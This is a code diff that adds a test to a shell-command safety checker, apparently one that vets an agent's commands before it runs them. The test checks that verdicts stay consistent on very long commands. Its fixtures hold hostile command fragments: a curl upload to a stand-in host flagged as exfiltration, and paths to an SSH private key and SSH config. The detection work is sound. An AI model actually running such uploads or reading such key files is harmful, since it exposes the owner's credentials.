@@ -291,6 +291,23 @@ describe("ambiguous runner prefix approvals", () => {
 });
 
 describe("bounded sensitive-path inspection", () => {
+  it.each([
+    { suffix: "/home/owner/.ssh/id_rsa", signal: shellSensitivePathSignal, reason: /sensitive path argument/ },
+    { suffix: "-T file http://example.test", signal: shellExfiltrationSignal, reason: /curl upload/ },
+    { suffix: "/home/owner/.s*/config", signal: shellScanOrdinaryAsk, reason: /budget exceeded/ },
+  ])("keeps raw and parsed verdicts equal above exhaustion for $suffix", ({ suffix, signal, reason }) => {
+    const prefix = `npx curl ${Array.from({ length: 2048 }, (_, index) => `x${index}`).join(" ")}`;
+    const command = withFixtureAccounts(`${prefix} ${suffix}`);
+    const parsed = parseShellCommand(command);
+    const parses = vi.mocked(shellAnalysis.analyzeShell);
+    parses.mockClear();
+    const rawVerdict = signal(command, accountDirectory);
+    expect(rawVerdict).toMatch(reason);
+    expect(parses.mock.calls.filter(([text]) => text === command)).toHaveLength(1);
+    expect(signal(parsed, accountDirectory)).toBe(rawVerdict);
+    expect(parses.mock.calls.filter(([text]) => text === command)).toHaveLength(1);
+  });
+
   it("caps canonical filesystem work across distinct argument counts", () => {
     const counts: number[] = [];
     for (const length of [1024, 2048]) {
